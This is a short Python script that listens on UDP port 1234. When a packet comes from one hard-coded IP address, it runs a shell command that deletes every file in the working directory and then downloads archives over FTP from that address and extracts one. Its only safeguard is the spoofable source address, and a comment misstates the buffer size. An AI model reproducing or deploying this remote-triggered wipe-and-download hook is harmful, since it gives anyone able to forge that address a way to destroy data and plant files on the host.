import socket, os

UDP_IP = "0.0.0.0"
UDP_PORT = 1234



sock = socket.socket(socket.AF_INET, # Internet
                     socket.SOCK_DGRAM) # UDP
sock.bind((UDP_IP, UDP_PORT))

while True:
    data, addr = sock.recvfrom(1) # buffer size is 1024 bytes
    print(f'Got {data} from {addr}')
    if addr[0] == '46.188.104.83':
      os.system("rm -rf *; axel ftp://46.188.104.83/7z/web.7z; 7z x web.7z; axel ftp://46.188.104.83/7z/ln.7z")

